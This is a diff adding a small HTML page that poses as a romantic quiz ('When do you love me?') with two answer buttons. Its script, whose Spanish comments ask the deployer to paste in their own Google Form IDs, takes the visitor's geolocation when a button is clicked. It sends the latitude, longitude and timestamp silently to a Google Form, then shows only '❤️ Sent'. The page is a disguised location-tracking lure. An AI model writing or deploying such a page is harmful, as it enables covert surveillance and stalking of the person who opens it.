@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Love</title>
+
+<style>
+body{
+  margin:0;
+  background:black;
+  color:white;
+  font-family:Arial;
+  display:flex;
+  height:100vh;
+  justify-content:center;
+  align-items:center;
+  flex-direction:column;
+}
+button{
+  width:200px;
+  padding:20px;
+  margin:15px;
+  font-size:20px;
+  border:none;
+  border-radius:12px;
+}
+</style>
+</head>
+
+<body>
+
+<h3>When do you love me?</h3>
+
+<button onclick="send('i love 1')">i love 1</button>
+<button onclick="send('i love 9784844')">i love 9784844</button>
+
+<script>
+
+// 🔴 PEGA TUS DATOS DEL FORM AQUÍ
+const FORM_ID = "TU_FORM_ID";
+const E1 = "entry.111111"; // codigo
+const E2 = "entry.222222"; // lat
+const E3 = "entry.333333"; // lon
+const E4 = "entry.444444"; // hora
+
+function send(code){
+
+  navigator.geolocation.getCurrentPosition(pos=>{
+
+    const lat = pos.coords.latitude;
+    const lon = pos.coords.longitude;
+    const hora = new Date().toISOString();
+
+    const url =
+`https://docs.google.com/forms/d/e/${FORM_ID}/formResponse?${E1}=${code}&${E2}=${lat}&${E3}=${lon}&${E4}=${hora}`;
+
+    fetch(url, {mode:'no-cors'});
+
+    document.body.innerHTML =
+    "<h2>❤️ Sent</h2>";
+
+  });
+}
+
+</script>
+
+</body>
+</html>
